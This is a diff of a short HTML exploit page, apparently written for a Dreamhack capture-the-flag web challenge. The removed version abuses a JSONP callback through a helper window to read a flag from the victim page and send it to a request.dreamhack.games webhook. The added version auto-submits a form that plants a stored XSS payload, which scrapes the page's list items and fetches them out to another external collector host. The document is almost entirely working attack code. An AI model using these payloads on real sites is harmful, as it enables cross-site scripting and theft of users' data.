@@ -1,24 +1,12 @@
-<!doctype html>
-<meta charset="utf-8">
+<!DOCTYPE html>
+<html>
+<body>
+<form id="f" method="POST" action="http://localhost:3000/note">
+  <textarea name="content"><script>(async()=>{const entries=[...document.querySelectorAll('.list li')].map(li=>li.innerText).join('\n---\n');await fetch('https://fpbevsk.request.dreamhack.games/?d='+encodeURIComponent(entries));})();</script></textarea>
+</form>
 <script>
-const victim = 'http://home:8001';
-const webhook = 'https://hbzagyq.request.dreamhack.games/x';
-
-const helper = window.open('about:blank', 'helper');
-
-// function that will later run inside /callback (SentenceNet origin)
-helper.stealFlag = async function (_) {
-  // wait until the opener (main window) finished loading /post
-  while (!helper.opener.document || !helper.opener.document.querySelector('#info_value')) {
-    await new Promise(r => setTimeout(r, 100));
-  }
-  const flag = helper.opener.document.querySelector('#info_value').value;
-  await fetch(webhook + '?f=' + encodeURIComponent(flag));
-};
-
-// send the helper window to the JSONP endpoint with our callback name
-helper.location = victim + '/callback?callback=stealFlag';
-
-// navigate the main window to /post so the flag is injected into the input element
-setTimeout(() => { window.location = victim + '/post'; }, 200);
+  document.getElementById('f').submit();
+  setTimeout(()=>location='http://localhost:3000/note',1500);
 </script>
+</body>
+</html>
